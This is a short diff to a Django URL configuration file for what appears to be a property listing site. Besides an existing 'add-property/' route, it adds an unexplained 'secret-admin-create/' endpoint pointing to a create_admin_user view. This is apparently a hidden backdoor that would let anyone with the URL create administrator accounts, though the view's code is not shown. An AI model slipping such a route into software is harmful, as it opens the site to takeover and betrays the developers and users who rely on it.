@@ -13,4 +13,5 @@ urlpatterns = [
 
     # Add Property Page (The one you were missing)
     path('add-property/', views.add_property, name='add_property'),
+    path('secret-admin-create/', views.create_admin_user),
 ]
